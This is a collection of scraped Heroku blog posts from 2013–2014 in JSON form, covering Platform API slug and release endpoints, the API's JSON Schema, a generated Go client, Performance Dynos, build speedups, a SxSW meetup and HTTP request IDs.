{"website": "Heroku", "title": "Programmatically release code to Heroku", "author": ["Michael Friis"], "link": "https://blog.heroku.com/programmatically_release_code_to_heroku_using_the_platform_api", "abstract": "Programmatically release code to Heroku Posted by Michael Friis December 20, 2013 Listen to this article Currently in beta, the Heroku Platform API lets developers automate, extend and combine the Heroku platform with other services in a programmatic, self-service way. Today we are setting the capstone into the API by adding slug and release endpoints to the API beta. These API endpoints are special. They expose a very core part of what Heroku does best: Quickly and safely releasing new versions of an app onto the Heroku platform. Using the new slug and release endpoints, platform developers can build integrations and services that completely sidestep the traditional Heroku Git deployment flow. So instead of requiring git push heroku master to deploy, it’s now possible to do things like: Write a script that builds an app in a local directory on your machine, tars it up, and deploys it directly to a Heroku app Extend your favorite continuous integration server or service to deploy directly to Heroku if unit tests pass – no need to use Git or manage SSH keys Move slugs around between Heroku apps, for example to promote a release on a staging app to a production app Are you a CI service provider, source code repository provider, or just a plain old hacker interested in the opportunities this opens up? We want to work with you, get in touch with friis@heroku.com . The slug and release endpoints complete the functionality that we plan to expose in the first version of the Heroku Platform API . The API is still in beta and we welcome questions and feedback in the Heroku API Forum . Slugs and Releases “Slug” refers to one of two things: A tarballed bundle of source code, fetched dependencies and compiled or generated output of a build system, ready for execution on the Heroku runtime A record created in the Heroku database when you register and upload a slug tarball using the slug endpoint on the platform API The slug API endpoint allows slug records to be created and read. It contains attributes including the URL of the slug tarball, the process types that the slug can run (mirroring the contents of the Procfile ), and a version control identifier (typically the SHA from the Git commit of the source code used to create the slug) Releases are versioned deployments of an app, containing a slug and a set of config vars. The release API endpoint allows releases to be created and read. Releases require a slug and can optionally contain a description. Slugs can be shared amongst releases – by fetching the slug from an existing release on any given app, a new release can be created on any other app using the existing slug. This allows slugs to be quickly and efficiently promoted between environments (such as from staging to production), and the release endpoint can be used to programmatically create custom deployment workflows. The rest of this post contains two examples that demonstrate the power of the new API endpoints. The first shows how to move slugs between apps, the second demonstrates how to create and deploy slugs from scratch, from your local machine. Full documentation is available on Dev Center in these articles: Copying slugs Creating slugs from scratch Reference Copying slugs There are several ways to get a valid slug that can be released to an app. The simplest method is to copy a slug generated by Heroku for a different app. Imagine that you have pushed code to a staging app, the code has been tested and you are now ready to release to production. Instead of pushing to the production app and waiting for the code to build again, you can simply copy the slug from the staging app to the production app. First, list releases on the staging app to get the id of the slug to release: $ curl -H \"Accept: application/vnd.heroku+json; version=3\" -n \\\nhttps://api.heroku.com/apps/example-app-staging/releases\n...\n\"slug\":{ \"id\":\"ff40c84f-a538-4b65-a838-88fdd5245f4b\" } Now, create a new release on the production app using the slug from the staging app: $ curl -X POST -H \"Accept: application/vnd.heroku+json; version=3\" -n \\\n-H \"Content-Type: application/json\" \\\n-d '{\"slug\": \"ff40c84f-a538-4b65-a838-88fdd5245f4b\"}' \\\nhttps://api.heroku.com/apps/example-app-production/releases That’s it! The new code is now running on the example-app-production app. Note that copying slugs between apps is already possible using the beta Pipelines plugin , and Heroku Fork uses a similar mechanism when forking an app. The slug and releases endpoints expose the primitives necessary for third-party API developers to build services offering similar functionality and much more. Creating slugs from scratch Slugs don’t have to be generated by Heroku: You can use the releases endpoint to deploy anything the platform recognizes as a valid slug . Let’s create a slug containing a simple Node.js app and the dependencies required to run it on Heroku. On your local machine, create a folder named app to hold the slug and fetch the Node.js runtime: $ mkdir app \n$ cd app\n$ curl http://nodejs.org/dist/v0.10.20/node-v0.10.20-linux-x64.tar.gz | tar xzv Add the app code in a file named web.js : // Load the http module to create an http server\nvar http = require('http');\n\n// Configure HTTP server to respond with `Hello World` to all requests\nvar server = http.createServer(function (request, response) {\n  response.writeHead(200, {\"Content-Type\": \"text/plain\"});\n  response.end(\"Hello World\\n\");\n});\n\nvar port = process.env.PORT;\n\n// Listen on assigned port\nserver.listen(port);\n\n// Put a friendly message on the terminal\nconsole.log(\"Server listening on port \" + port); Tar up the slug: $ cd ..\n$ tar czfv slug.tgz ./app The above process of creating a slug is a very simplified variant of what buildpacks do when normal slugs are created on Heroku: Make sure the source code is placed where it’s supposed to be and package any dependencies (the Node.js runtime in this case) into the slug. The slug is now ready for release. This is a three-step process: Create a unique id and URL for the slug using the new slug endpoint Upload the slug Release the slug on the app First, we register the new slug using the API. We have to keep track of the “put” url and the id that Heroku returns: $ curl -X POST -H 'Content-Type: application/json' \\\n-H 'Accept: application/vnd.heroku+json; version=3' \\\n-d '{\"process_types\":{\"web\":\"node-v0.10.20-linux-x64/bin/node web.js\"}}' \\\n-n https://api.heroku.com/apps/example-app/slugs\n...\n  \"blob\":{\n    \"method\": \"put\",\n    \"url\": \"https://s3-external-1.amazonaws.com/herokuslugs/heroku.com/...\"\n  },\n  \"id\":\"d969e0b3-9892-3113-7653-1aa1d1108bc3\" Notice that we pass a “process_types” parameter. This has content similar to what is included in the Procfile that is typically included in apps pushed to Heroku. Passing process_types is necessary because the Procfile is not parsed when slugs are launched in dynos. Instead, the Procfile is parsed by the build system and the contents are passed in when the slug is created as demonstrated above. Use curl to upload the slug to the URL provided by Heroku: $ curl -X PUT -H \"Content-Type:\" --data-binary @slug.tgz \"https://s3-external-1.amazonaws.com/herokuslugs/heroku.com/…\" Finally, release the slug to the app example-app : $ curl -X POST -H \"Accept: application/vnd.heroku+json; version=3\" \\\n-H \"Content-Type: application/json\" \\\n-d '{\"slug\":\"d969e0b3-9892-3113-7653-1aa1d1108bc3\"}' \\\n-n https://api.heroku.com/apps/example-app/releases We can then check that the release was created: $ heroku releases --app example-app\n=== example-app Releases\nv3  deploy  example@example.com  2013/10/08 16:09:54 (~ 1m ago) To verify that the slug was deployed, run $ heroku open --app example-app . Please see the full example on Dev Center for additional details on how to create slugs. The Dev Center article has both the Node.js example above and examples demonstrating how to create simple slugs with Ruby and Go apps. Summary With the releases and slugs endpoints, the primitives that power Heroku features like Pipelines and Fork are now available to developers using the Platform API. This opens up a lot of exciting possibilities for partners and hackers to build and innovate on top of Heroku. We will be working with partners to build integrations as we take the API to general availability. Get in touch with friis@heroku.com if you are interested in participating. The release and slug endpoints are in public beta with the rest of the Platform API. Once we’re confident the API is free of bugs, we will freeze the design and release it into GA. Until that time, we may introduce breaking changes to the API. All changes will be posted in the Heroku Changelog . If you have any questions or feedback, please start a discussion in the Heroku API Forum .", "date": "2013-12-20,"},
{"website": "Heroku", "title": "JSON Schema for the Heroku Platform API", "author": ["Michael Friis"], "link": "https://blog.heroku.com/json_schema_for_heroku_platform_api", "abstract": "JSON Schema for the Heroku Platform API Posted by Michael Friis January 08, 2014 Listen to this article Today we’re making an important piece of Platform API tooling available: A machine-readable JSON schema that describes what resources are available via the API, what their URLs are, how they are represented and what operations they support. The schema opens up many interesting use cases, both for users and for us at Heroku working on improving and extending the API. A few examples are: Auto-creating client libraries for your favorite programming language Generating up-to-date reference docs Writing automatic acceptance and integration tests We are already using the schema to maintain the API reference documentation on Dev Center and to generate several v3 client libraries: Heroics for Ruby node-heroku-client heroku.scala and heroku-go Of these, Heroics is officially supported by Heroku and the other three are community projects created by Heroku engineers. If you find bugs or have suggestions for enhancements, please send a pull request. We’re interested in having even more client libraries and hope hackers in the Heroku community will start building libs for other languages, either auto-generated ones using JSON Schema or hand-written ones. How to use the Schema The API serves up its own JSON-formatted schema using HTTP: $ curl https://api.heroku.com/schema -H \"Accept: application/vnd.heroku+json; version=3\"\n{\n  \"description\": \"The platform API empowers developers to automate, extend and combine Heroku with other services.\",\n  \"definitions\": {\n  …\n  }\n} Let’s take a closer look at the schema definition for the app object (edited for brevity): \"app\": {\n  \"description\": \"An app represents the program that you would like to deploy and run on Heroku.\",\n  ...\n  \"definitions\": {\n    \"name\": {\n      \"description\": \"unique name of app\",\n      \"example\": \"example\",\n      \"pattern\": \"^[a-z][a-z0-9-]{3,30}$\",\n      \"type\": [\n        \"string\"\n      ]\n    }\n  },\n  \"links\": [\n    {\n      \"description\": \"Create a new app.\",\n      \"href\": \"/apps\",\n      \"method\": \"POST\",\n      \"rel\": \"create\",\n      \"schema\": {\n        \"properties\": {\n          \"name\": {\n            \"$ref\": \"#/definitions/app/definitions/name\"\n          }\n        }\n      },\n      \"title\": \"Create\"\n    }\n  ],\n  \"properties\": {\n    \"name\": {\n      \"$ref\": \"#/definitions/app/definitions/name\"\n    }\n  }\n} From the schema, we can surmise that the app object has a name property of type string . We even get a regex describing acceptable values for the name property. The “links” element describes the methods available on the app object. The sample above only includes the POST method used to create a new app. The link object includes a schema property that shows that specifying a name property is optional when creating an app. Feel free to explore the full schema to see what other information is available and check out the Heroics README and source code for ideas on how to use it. JSON Schema When deciding on a format to describe and document the API, we had the following requirements: JSON-based, like the rest of the content served by the API Clean and simple enough to allow human perusal Expressive enough to facilitate generating documentation and client libraries As much as possible, we also wanted the format to be based on open standards to allow re-use of existing code and tooling. WSDL and its cousin WADL are probably the most well-known mechanisms for describing web services. They weren’t appropriate for Heroku’s API, however: WSDL is XML-based, complicated and rather verbose. Instead, we settled on JSON Schema for the base format. Combined with the draft Validation and Hypertext extensions, we had the expressiveness required to meet our design objectives with a JSON format. As a bonus, both Swagger and the Google API discovery service are built on JSON Schema and it’s a fairly well-established standard with lots of tooling and other resources already available . Summary Publishing a machine-readable schema for your API is good practice: It makes keeping docs up to date easier and it greatly simplifies maintenance of up-to-date client libraries. We think JSON Schema is a solid foundation for describing APIs and we will continue to invest in the format and it’s extensions and in relevant tooling that make using APIs easier. We also hope the Heroku community will take advantage of the API schema to build and contribute to clients and tools in addition to the ones we release today. Our goal is to make the Platform API easy to consume from a wide variety of languages and frameworks. If you come up with something cool and want to tell us about it then drop us a line on api-feedback@heroku.com . If you have questions about how to use the schema or comments on its design, please create a topic in the Platform API Forum .", "date": "2014-01-08,"},
{"website": "Heroku", "title": "Auto-generating a Go API client for Heroku", "author": ["Blake Gentry"], "link": "https://blog.heroku.com/auto_generating_a_go_api_client_for_heroku", "abstract": "Auto-generating a Go API client for Heroku Posted by Blake Gentry January 09, 2014 Listen to this article Editor's note: This is a cross post from Blake Gentry , an engineer at Heroku. This is a post about the recently announced Heroku Platform API JSON Schema and how I used that schema to write an auto-generated Go client for the API. Heroku's API team has spent a large part of the past year designing a new version of the platform API . While this is the 3rd incarnation of the API, neither of the two previous versions were publicly documented. In fact, the only documentation on the old APIs that was ever published is the source code of the Heroku Rubygem , which powers the Heroku Toolbelt . That worked fairly well at the time for Heroku's Ruby-centric audience, but it was never ideal, especially since Heroku's developer audience now uses many languages besides Ruby. Additionally, the first two \"versions\" of Heroku's API were developed organically as the platform's capabilities evolved, with contributions made by many engineers over the years. The API was built primarily as an interface for the toolbelt, rather than as a product. It was also not properly versioned, as there was no process for managing changes publicly. And because the API was not treated as a product in and of itself, the old APIs are scarred by numerous inconsistencies and lack coherence. JSON Schema When the API team embarked on the v3 project, they realized that several of their goals could be made easier if they decided to codify their API design as JSON Schema . Specifically, the JSON schema would make possible: Automatic generation of documentation Automatic server-side validations of input from clients Automatic generation of API client libraries in multiple languages Simpler design of the API by making inconsistencies easier to spot If you're interested in learning more about JSON Schema, Understanding JSON Schema is an excellent resource. Getting the schema The API serves up its own JSON schema programmatically, helping to ensure that the version being provided to users is actually the one that's being used for things like input validation. You can fetch the up-to-date version using curl: $ curl https://api.heroku.com/schema  -H \"Accept: application/vnd.heroku+json; version=3\" {\n  \"type\": [\n    \"object\"\n  ],\n  \"title\": \"Heroku Platform API\",\n  \"$schema\": \"http://json-schema.org/draft-04/hyper-schema\",\n  \"properties\": {\n    \"app\": {\n      \"$ref\": \"/definitions/app\"\n    },\n    ...\n    }\n  },\n  \"definitions\": {\n    \"app\": {\n      \"type\": [\n        \"object\"\n      ],\n      \"title\": \"Heroku Platform API - Apps\",\n      \"$schema\": \"http://json-schema.org/draft-04/hyper-schema\",\n      \"id\": \"schema/app\",\n      \"description\": \"An app represents the program that you would like to deploy and run on Heroku.\",\n      \"properties\": {\n        \"web_url\": {\n          \"$ref\": \"#/definitions/app/definitions/web_url\"\n        },\n        \"updated_at\": {\n          \"$ref\": \"#/definitions/app/definitions/updated_at\"\n        },\n        \"stack\": {\n          \"$ref\": \"#/definitions/stack/definitions/name\"\n        },\n        ...\n      },\n      \"links\": [\n        {\n          \"title\": \"Create\",\n          \"schema\": {\n            \"properties\": {\n              \"stack\": {\n                \"$ref\": \"#/definitions/stack/definitions/identity\"\n              },\n              \"region\": {\n                \"$ref\": \"#/definitions/region/definitions/identity\"\n              },\n              \"name\": {\n                \"$ref\": \"#/definitions/app/definitions/name\"\n              }\n            }\n          },\n          \"rel\": \"create\",\n          \"method\": \"POST\",\n          \"href\": \"/apps\",\n          \"description\": \"Create a new app.\"\n        ],\n        ...\n      }\n    },\n  ...\n  },\n  \"description\": \"The platform API empowers developers to automate, extend and combine Heroku with other services.\"\n} You can view the complete schema by performing the curl request above, or check out a version of it that I saved on 2013-12-26 . More details about the Heroku API team's path to using JSON schema are available in their blog post on the subject. Generating a client from the schema A number of Heroku engineers had already taken a crack at generating API clients from the schema: Heroics for Ruby node-heroku-client for Node.js Heroku.scala for Scala I spend a great deal of my time working in Go, on hk in particular. hk is a command-line interface for Heroku that interacts heavily with the Heroku API, so a fully-functional Go API client was of great interest to me. Hand-writing the Golang base client and App model I've used a number of auto-generated libraries before; they tend to feel like they were made to be used by a computer rather than a human. That's a feeling I wanted to avoid with my client. I considered a dynamic approach that processed the schema at runtime, but ultimately decided that I wanted to preserve the benefits of Go's static type system. I also wanted to make sure that my code, as much as possible, felt like idiomatic Go, and that it was fully documented in the godoc style. However, I'd never written a non-trivial piece of auto-generated code before. In order to produce high quality auto-generated code that felt hand-written, I thought it made sense to start by hand writing the base API client with tests . I also hand-coded a single model ( the App model ) with its own tests . The base client was derived from client code that was originally baked into hk by Keith Rarick . I iterated on both the base client and the App model code for a couple of days to make sure that it felt like clean, idiomatic Go code before I attempted to replicate the result with a generator. Design Notes One of the things I struggled with while hand-writing the App model was how to cleanly & consistently deal with parameters in API calls. The decision was easy for required parameters: just make them normal, typed function arguments. Simple functions, like getting or deleting a single object, were straightforward to write in this way: // Info for existing app.\n//\n// appIdentity is the unique identifier of the App.\nfunc (c *Client) AppInfo(appIdentity string) (*App, error) {\n    var app App\n    return &app, c.Get(&app, \"/apps/\"+appIdentity)\n}\n\n// Delete an existing app.\n//\n// appIdentity is the unique identifier of the App.\nfunc (c *Client) AppDelete(appIdentity string) error {\n    return c.Delete(\"/apps/\" + appIdentity)\n} Optional parameters, however, required more thought. In some cases, I had to be able to distinguish between the empty value for a parameter and the value not being provided. For example, if the parameter for dyno scale was an int and it was never assigned a value, Go's zero value would be 0. It would be dangerous to assume that the user intended to scale their app to 0. I could have special cased these kinds of situations (maybe using -1 to mean \"don't modify\"), but that would have made the interface inconsistent. Instead, I opted to make optional parameters be a pointer of their actual type. In the case of dyno scale, that means that the parameter is scale *int instead of scale int . If scale == nil , then the parameter is omitted altogether from the body of the API call. Fortunately, Go's JSON encoding with omitempty works seamlessly with this approach. Additionally, while most API actions only had one or two optional arguments, some had three or four (along with required arguments). I don't generally like using functions with so many arguments, especially for optional arguments where I'd have to pass a nil for each one that I didn't want to provide. I also didn't want to use a map[string]interface , as that would mean a loss of type safety. In the end, I decided to use a dedicated Opts struct for each function with optional arguments, such as AppCreateOpts for the AppCreate function. The caller of the function can then provide nil when they don't want to set any optional parameters, or provide a *AppCreateOpts struct with any desired options set to non-nil values. Here's how that looks: // Create a new app.\n//\n// options is the struct of optional parameters for this action.\nfunc (c *Client) AppCreate(options *AppCreateOpts) (*App, error) {\n    var appRes App\n    return &appRes, c.Post(&appRes, \"/apps\", options)\n}\n\n// AppCreateOpts holds the optional parameters for AppCreate\ntype AppCreateOpts struct {\n    // unique name of app\n    Name *string `json:\"name,omitempty\"`\n    // identity of app region\n    Region *string `json:\"region,omitempty\"`\n    // identity of app stack\n    Stack *string `json:\"stack,omitempty\"`\n} Finally, I needed to provide a way to utilize the Heroku API's pagination. The API uses Range headers to provide pagination and sorting. Since I already had the notion of an options struct, I decided to use the same pattern for list ranges. The ListRange struct lets users specify any of these options for API calls that list object collections: // List existing apps.\n//\n// lr is an optional ListRange that sets the Range options for the paginated\n// list of results.\nfunc (c *Client) AppList(lr *ListRange) ([]App, error) {\n    req, err := c.NewRequest(\"GET\", \"/apps\", nil)\n    if err != nil {\n        return nil, err\n    }\n\n    if lr != nil {\n        lr.SetHeader(req)\n    }\n\n    var appsRes []App\n    return appsRes, c.DoReq(req, &appsRes)\n} Generating the Golang API client Once I had a sample of what I wanted to generate, I set off trying to build a script that could produce that output based on the JSON schema input. Initially I started writing this in Go, but I quickly realized that was a mistake. Go is great for a lot of things, but highly dynamic templates are not its strong point. Instead, I used an early version of Heroics as a starting point. While the current version of Heroics dynamically ingests the JSON Schema to generate classes and methods at runtime, an early incarnation instead used ERB templates to generate static Ruby code. With this starting point, I began modifying the templates to generate Go code instead of Ruby code. I started from a position of complete ignorance about the JSON schema specification and tried to figure it out based on what Heroics was already doing. I did not make any attempts to formally parse the JSON schema. Rather, I just iterated on my script until its output converged with my desired code in the App model. Eventually, I got the results to match 100%, so I began trying to generate the other models as well. Some of them were straightforward, but many had additional edge cases or quirks that required some additional logic in the generator derived from other aspects of the JSON schema. I'd resolve an edge case, then the generator would go a little further before hitting another. As a side note, I want to call out how much easier this project was because of go fmt . I can generate Go code from a template and not pay any attention to excess whitespace or indentation as a simple go fmt will clean it all up for me. Auto-generated code can be awesome In the end, I was able to auto-generate all of the models within about 3-4 days, weighing in at 26 models and 2176 lines (excluding the base client). While the generator is some of the ugliest code I've ever written, given the sheer volume of code involved, writing the generator saved significant time compared to hand-writing the entire client. Using a generator has also made it much easier to update my client when the schema changes, which has happened quite a few times during the Platform API's public beta period. It's also enabled some project-wide refactoring just by changing a couple of lines in the generator. Just re-run the generator, verify the diff, and commit it. Please check out heroku-go and its documentation [Edit: these links have been updated to point to the currently maintained version as of March 2019] . I'd love feedback on the resulting Go code in the form of Github issues and pull requests! api golang platform", "date": "2014-01-09,"},
{"website": "Heroku", "title": "Heroku XL: Focusing on Large Scale Apps", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/heroku-xl", "abstract": "Heroku XL: Focusing on Large Scale Apps Posted by Matthew Soldo February 02, 2014 Listen to this article Having a web or mobile app become hugely popular is one of those \"good problems\" to have.  But success is still its own challenge - making any architecture work at high volume can often create a unique kind of complexity.  And as the Internet grows, and apps become more prevalent, its an increasingly common requirement. The largest app on Heroku routinely exceeds 10,000 requests / second, and two of the top 50 sites on the Internet (as measured by Quantcast ) - Urban Dictionary ( 45th largest ) and Upworthy ( 40th largest ) - run on Heroku.  Across all apps, Heroku is now serving over 5 billion requests per day (or about 60,000 requests per second). Heroku has always been guided by the goal of making it as easy as possible to build and scale apps in the cloud, and we want to extend those same benefits to the largest \"XL\" app developers. Working with these and other customers, we’ve seen a consistent pattern of requirements from high scale apps, which we are announcing today as a set of features and services to help make the pattern of XL apps simpler and more easily repeatable. Performance Dynos In order to run and operate large scale apps, Heroku has made the most significant redesign of the dyno since it was first introduced. The result is the new Performance Dyno , launching today. Performance Dynos are highly isolated from other dynos, providing a high and consistent quality of service. They have 12 times the memory of a 1X dyno, and significantly more compute resources. The result is that apps running on performance dynos can have faster and more consistent response times, particularly for their perc99 latencies . The design of Performance Dynos was driven by the requests of our largest customers for how they want to deploy their apps. In our most popular languages and frameworks, the trend in deployments on Heroku is towards heavy in-dyno concurrency. High worker utilization in Unicorn and Gunicorn, or multi-threaded environments such as Puma (with Rubinius or jRuby) or Node Cluster benefit from vertical scaling - more cores, more I/O, and more performance. Under the covers, Performance Dynos occupy the same LXC containers as 1X and 2X dynos. This means that applications can migrate to them in seconds, and they still enjoy the ease-of-use and instant scaling that you expect from Heroku. Unlike traditional dynos, the LXC container for Performance Dynos occupies an entire virtual compute instance (as of the time of this post, it is an AWS c1.xlarge). This provides the instance with extremely high isolation from the loads of other dynos and apps running on our platform. As a result, apps using Performance Dynos can achieve consistent, predictable performance. Performance Dynos are available immediately in Heroku's US region for $0.80 / hour and can be provisioned via the Heroku dashboard or toolbelt : $ heroku ps:resize web=PX This chart outlines the specs for Performance Dynos using a 1X Dyno for reference: 1X Dyno Performance Dyno RAM 512 MB 6 GB Compute 1 1x - 4x 2 40x (8 CPU cores) Price $0.05 / hour $0.80 / hour 1 Overall performance will vary heavily based on app implementation. 2 1X Dyno performance will vary based on available system resources Measuring Resource Utilization with runtime and postgres metrics How do you know if you need Performance Dynos? The first step is to better understand the resource consumption for your app. We have a tool for doing just this. Runtime metrics emit the load and memory usage for each dyno to application log streams : source=web.1 dyno=heroku.2808254.d97d0ea7-cf3d-411b-b453-d2943a50b456 sample#load_avg_1m=2.46 sample#load_avg_5m=1.06 sample#load_avg_15m=0.99    \nsource=web.1 dyno=heroku.2808254.d97d0ea7-cf3d-411b-b453-d2943a50b456 sample#memory_total=21.00MB sample#memory_rss=21.22MB sample#memory_cache=0.00MB sample#memory_swap=0.00MB sample#memory_pgpgin=348836pages sample#memory_pgpgout=343403pages In general, you can maximize the performance of an app by increasing its concurrency (threads or processes) until it is using most of its available memory, so long as its load is less than the number of CPU cores available to it. The ideal settings vary from app to app. To help you through the process of maximizing your application performance, we have created this dyno optimization guide . In addition to runtime metrics, you can now also measure the resource utilization of your Heroku Postgres database (available for standard tiers and above). Just like runtime metrics, Postgres metrics are emitted to application log streams. Postgres metrics include: Index hit rate Cache hit rate Database size Load Memory Usage I/O Operations (Load, memory, and I/O are only available on some plans, see the docs for details.) And if you want to view trending for these resource metrics, you can do so with our partner Librato. Just install their add-on on the Nickel plan or above . Runtime metrics are currently in beta, and we appreciate any feedback you have on how we can improve them. Supporting At-Scale Apps When apps achieve high scale, they are being used around the clock. Companies who run these apps need vendors who can support them 24/7. To this end, we are announcing pricing for our premium support plans . All Heroku apps include standard business-hour support that is triaged on a basis of issue severity, and although we work hard to be responsive there is no guaranteed turnaround time. If your business requires a higher support level, it is now available through our Premium Support Tier. It provides 24/7 support with a 1-hour SLA for critical tickets (most tickets are answered in less than 10 minutes). Premium Support : 24/7 Support, 1-Hour SLA for Critical Tickets. $1,000 / mo or 20% of account spend (whichever is greater). Technical Account Management : All of the features of Premium Support, plus technical consultation with a dedicated support engineer. Technical Account Management is $1,000 / mo in addition to the price of Premium Support. Pricing and details for Heroku’s support tiers are available on our pricing page . Understanding Perc99 and Tail Latencies The basic measurement of web application performance is response times - the time between a client’s request and the app’s response. Faster response times are better. The most common way of tracking response times is to take the average and track its trending over time. But averages only tell part of the story. Consider an app that has two methods, one of which has a response time of 10 ms, and the other with a response time of 1,000 ms. If the fast method is called 90% of the time, then the average response time for the app would be a respectable 109 ms. But this average disguises the fact that one part of the app is very fast while another is very slow. Another approach is to measure the slowest (i.e. maximum) response times. Again, this can be ineffective, as a single slow response will skew the results. In the above example, if the app had a third method that responded in 30,000 ms that was called less than 1% of the time, the maximum response time would be 30,000 ms - clearly not representative of how most users experienced the app. The \"goldilocks\" solution is to measure the 99th percentile response times (i.e. perc99). Perc99 is the time which is slower than 99% of requests, but faster than 1%. By definition, they account for the majority of an app’s performance (99% of it), without being susceptible to extreme outliers. Continuing our example, the perc99 would be 1,000 ms - which is a reasonable measure of the upper end of the response time that most users on the app would experience. For more information on tail latencies, see The Tail at Scale from Research at Google. When a well-optimized app is under light to moderate loads, the perc99 response time is not significantly larger than average response times (in most cases). However as the traffic hits significant loads (over 1,000 requests per second) the perc99 response times will begin to grow much more quickly than the average. This is precisely what Performance Dynos were designed to solve. They allow dynos to have more concurrency and execute more consistently, which results in perc99’s being reduced substantially. Our beta customers have seen perc99’s reduced by 80-90% by switching to performance dynos. Measuring perc99 response times has previously been difficult. However by working with two of our visibility partners, it is now as easy as provisioning an add-on on your Heroku app. New Relic now measures and displays perc99 and perc95 response times as well as histograms of app performance (just make sure your app has the latest library installed). Librato also measures perc95 and perc99 response times. It uses Heroku router logs from your app, so there is no client library to install. Summary As the world’s digital consumption continues to grow, it will be increasingly common for apps to hit high scales quickly. With the tools introduced today, you can be confident that when your app is ready to scale, Heroku will scale with it. If your app’s usage is starting to ramp up, or may be soon, you can get in touch with us to evaluate your app and discuss your scaling plans .", "date": "2014-02-02,"},
{"website": "Heroku", "title": "Git Push Heroku Master: Now 40% Faster", "author": ["John Simone"], "link": "https://blog.heroku.com/git_push_heroku_master_now_40_faster", "abstract": "Git Push Heroku Master: Now 40% Faster Posted by John Simone February 11, 2014 Listen to this article Flow is an important part of software development. The ability to achieve flow during daily work makes software development a uniquely enjoyable profession. Interruptions in your code/test loop make this state harder to achieve. Whether you are running unit tests locally, launching a local webserver, or deploying to Heroku there's always some waiting and some interruption. Every second saved helps you stay in your flow. We’ve been working on reducing the time it takes to build your code on Heroku. Read through this post for details on the process we used to make builds\nfast, or check out the end result from the graph below: Let's take a look at our process in delivering these improvements further. It all starts with instrumentation Every speed improvement effort starts with visiblity. We collected detailed\nmetrics about every part of our build infrastructure and in each of our\nbuildpacks. These metrics allowed us to see where time was being spent. We\nwere also able to measure how each update we made impacted the build phase it\nwas meant to improve. Improvements to our build infrastructure With detailed timing data in hand, we were able to make changes to how our\nbuild fleet and git service work. These included additional caching, improved\nmechanisms for file transfers and storage ,\nand providing better user feedback to let you know what is happening during your builds. One crucial step in the build process that had room for improvement was the\ncreation of the slug archive. We found this was taking an appreciable amount of time and were able\nto improve it by using pigz which is a parallelized\nimplementation of gzip. Improvements to the efficiency of individual buildpacks In addition to the changes to the build process, we had an opportunity for\neach of our language specialists to dig in and optimize their specific\nbuildpacks. This included a range of improvements from being more efficient\nabout how dependencies are downloaded, to making better use of the build\ncache, to pre-fetching common dependencies. This process involved many changes across all buildpacks. Some of the most\nsignificant are highlighted in the Heroku\nchangelog : Rails 4 asset pipeline speed improvements Play 2.x slugs exclude SBT compile-only artifacts New Node.js Buildpack Improved build caching for apps using multiple buildpacks The results We've achieved improvements in build time across all languages on Heroku.\nAlthough we looked at much more detailed metrics while changes were being\nmade, our target was improving build times at all percentiles on a per\nlanguage basis. We’ve showed you the 50th percentile or median because it\nproved to be a good proxy for the other metrics in this case. Being able to deploy code and iterate on ideas quickly is a big part of\ndeveloper happiness. We will continue to use the metrics we’ve created to look\nfor more ways to improve build and deployment speed. As always, we welcome\nyour feedback on how we can improve your experience and help you maintain your\nflow. buildpacks performance languages", "date": "2014-02-11,"},
{"website": "Heroku", "title": "Join us at SxSW Interactive", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/sxsw", "abstract": "Join us at SxSW Interactive Posted by Sara Dornsife February 27, 2014 Listen to this article Every year tens of thousands of people descend on Austin, TX for SxSW Interactive to learn about the latest in digital technologies. This year Heroku is descending as well and we want to see you there. Orange Oasis Fri., March 7th and Sat., March 8th\nBrass House - 115 San Jacinto Blvd (@ 2nd St) Heroku will be a part of ExactTarget’s Orange Oasis at Brass House. Close to the convention center, but out of the noise and crowds of SxSW, we’ll have a Purple Pavilion inside the Orange Oasis. Please stop by and say hello, or schedule a private meeting or demo with one of sales or technical reps. Hours: Friday, March 7th 1p - 4p Meetings and product demos 4p - 6p Join us for Happy Hour Saturday, March 8th 10a - 4p Meetings and product demos 4p - 6p Join us for Happy Hour Heroku SxSW User Meetup Sunday, March 9th C Boys - 2008 South Congress Ave (@Leland) Join us for the Heroku SxSW User Meetup on Sunday March 9th from 5-8pm at C Boys on South Congress. We will have lots of yummy food from The Original New Orleans Po Boy and Gumbo Shop , a haiku poetry slam with Bob Makela, author of Barstool Poetry , Heroku experts to answer your questions, and an open bar if you are so inclined. Getting there and back: C Boys is located south of Lady Bird lake. It is a 1.7 mile walk up the well-known South Congress Ave shopping area from the Austin Convention Center. The CapMetro southbound bus will take you there. Get off at the Congress and Oltorf stop. If you are in a car, there is parking, but please do not drink and drive. Cabs are also always an option. Space is limited, RSVP now . See you there.", "date": "2014-02-27,"},
{"website": "Heroku", "title": "HTTP Request IDs improve visibility across the application stack", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/http_request_id_s_improve_visibility_across_the_application_stack", "abstract": "HTTP Request IDs improve visibility across the application stack Posted by Matthew Soldo February 28, 2014 Listen to this article Visibility into your application is necessary to properly analyze and troubleshoot issues as they arise. One of the key factors to good visibility is using logs as event streams and treating them as the canonical source of what happened on an app. The challenge with using logs is to correlate events across the stack consisting of your application's code and Heroku's platform components. Today, we are releasing new functionality that makes this simple. By using the emerging X-Request-ID convention, you can easily correlate multiple log entries to individual HTTP(s) requests. HTTP Request IDs are now enabled on all Heroku apps. Understanding X-Request-ID on Heroku Each HTTP request that reaches your dyno will now contain an X-Request-ID header. Heroku will pass through existing X-Request-ID headers if they are set by the HTTP client. For requests that lack the header, Heroku generates an ID. Your application code can read the request ID from the header and include it in logs, or use it for other purposes. Heroku will write request ID values in the logs from our routing layer as request_id . The X-Request-ID header is an emerging convention introduced by the Rails framework. It is a standard HTTP header, however, and can be easily accessed from any language or framework running on Heroku. For full documentation on this feature, please visit the Dev Center . Using Request IDs Your application code can read and log the X-Request-ID header value, giving you further insight into end to end behavior and performance. We have provided examples implementing this in Node.js , Python , Ruby ( Rack Middleware or Rails ), and Java . To get the most out of request IDs, be sure to store your logs for later search and analysis by using a logging add-on provider . Conclusion This capability will allow you to see how requests and application code may be modifying behavior through the application stack, find the source of request errors, and get improved overall visibility into the performance characteristics of your application.", "date": "2014-02-28,"},
